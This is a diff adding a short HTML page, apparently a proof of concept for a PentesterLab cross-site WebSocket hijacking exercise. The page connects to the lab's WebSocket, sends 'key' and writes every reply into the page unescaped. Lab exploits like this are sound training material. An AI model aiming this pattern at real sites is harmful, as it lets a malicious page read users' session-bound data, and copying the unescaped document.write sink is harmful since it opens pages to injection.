@@ -1,0 +1,11 @@
+<html>
+<script>
+var exampleSocket = new WebSocket("ws://ptl-0dc3aa5d-3de0f4a5.libcurl.so/pentesterlab");
+exampleSocket.onmessage = function(message) {
+	document.write(message.data);
+}
+
+exampleSocket.onopen = () => exampleSocket.send("key");
+
+</script>
+</html>
